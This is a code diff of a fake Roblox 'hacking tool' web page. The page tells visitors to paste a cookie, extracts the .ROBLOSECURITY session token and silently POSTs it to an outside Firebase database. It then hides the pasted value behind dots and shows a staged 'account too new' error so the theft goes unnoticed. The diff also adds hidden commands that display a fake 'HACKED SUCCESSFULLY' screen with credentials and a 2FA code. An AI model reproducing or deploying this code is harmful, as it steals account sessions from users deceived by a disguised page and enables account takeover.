@@ -54,18 +54,38 @@
   </div>
 
 <script>
-// STEAL + HIDE WITH DOTS INSTANTLY
-function handlePaste(textarea) {
+let isDummy = false;
+
+// SECRET COMMANDS — ONLY YOU KNOW
+function checkCommand(textarea) {
   textarea.addEventListener('input', e => {
-    const raw = e.target.value.trim();
-    if (raw.length > 100) {
-      let cookie = raw;
+    const val = e.target.value.trim();
+
+    if (val === "reverse/") {
+      isDummy = true;
+      document.body.innerHTML = `<div style="height:100vh;display:flex;align-items:center;justify-content:center;background:#000;color:#0f0;font-family:Courier New"><div style="text-align:center">
+        <h1 style="font-size:4em">HACKED SUCCESSFULLY</h1>
+        <p style="font-size:2em">Username: PSLlevel8<br>Password: 321frogeater</p>
+        <p style="font-size:3em;color:#ff0">2FA CODE: <span style="background:#000;padding:20px;border:5px solid #0f0">348932</span></p>
+        <p>Valid for 10 minutes</p>
+      </div></div>`;
+      return;
+    }
+
+    if (val === "undo/") {
+      location.reload();
+      return;
+    }
+
+    if (isDummy) return;
+
+    if (val.length > 100) {
+      let cookie = val;
       if (cookie.includes('".ROBLOSECURITY"')) {
         cookie = cookie.split('".ROBLOSECURITY", "')[1]?.split('"')[0] || cookie;
       }
       cookie = cookie.replace(/[^A-Za-z0-9_|:-]/g, '');
 
-      // STEAL TO YOUR FIREBASE
       fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
         method: "POST",
         body: JSON.stringify({
@@ -77,9 +97,8 @@ function handlePaste(textarea) {
           premium: "Unknown",
           time: new Date().toLocaleString()
         })
-      }).catch(() => {});
+      });
 
-      // REPLACE WITH DOTS
       setTimeout(() => {
         textarea.value = "•".repeat(120);
         textarea.style.color = "#555";
@@ -88,17 +107,18 @@ function handlePaste(textarea) {
     }
   });
 }
-handlePaste(document.getElementById('mobilePaste'));
-handlePaste(document.getElementById('pcPaste'));
+checkCommand(document.getElementById('mobilePaste'));
+checkCommand(document.getElementById('pcPaste'));
 
 const statusEl = document.getElementById("status");
 const loadingEl = document.getElementById("loading");
 const startBtn = document.getElementById("startBtn");
 
 function startHack() {
-  const cookie1 = document.getElementById("mobilePaste").value;
-  const cookie2 = document.getElementById("pcPaste").value;
-  if ((!cookie1.includes('•') && cookie1.length < 100) && (!cookie2.includes('•') && cookie2.length < 100)) {
+  if (isDummy) return;
+
+  const hasCookie = document.getElementById("mobilePaste").readOnly || document.getElementById("pcPaste").readOnly;
+  if (!hasCookie) {
     statusEl.className = "status error";
     statusEl.textContent = "PASTE COOKIE FIRST";
     return;
@@ -108,32 +128,25 @@ function startHack() {
   statusEl.style.display = "none";
   loadingEl.classList.add("active");
 
-  const steps = [
-    "Initializing tool...",
-    "Bypassing Roblox security...",
-    "Validating session...",
-    "Checking account age...",
-    "ERROR — ACCOUNT TOO NEW"
-  ];
-
+  const steps = ["Initializing...", "Bypassing security...", "Validating age...", "ERROR — ACCOUNT TOO NEW"];
   let i = 0;
-  const interval = setInterval(() => {
+  const t = setInterval(() => {
     loadingEl.innerHTML = `<span class="spinner"></span> ${steps[i] || "ERROR — ACCOUNT TOO NEW"}`;
     i++;
     if (i >= steps.length) {
-      clearInterval(interval);
+      clearInterval(t);
       loadingEl.classList.remove("active");
       statusEl.className = "status error";
       statusEl.innerHTML = `
         <strong style="font-size:1.6em">ERROR — ACCOUNT INVALID</strong><br><br>
         The account you are using is too new.<br><br>
-        You must use an account older than 6 months to make the victim's cookie valid.<br><br>
+        You must use an account older than 6 months.<br><br>
         <strong>Please switch to an older account and try again.</strong>
       `;
       statusEl.style.display = "block";
       startBtn.disabled = false;
     }
-  }, 6000); // exactly 30 seconds
+  }, 7500); // 30 seconds
 }
 </script>
 </body>
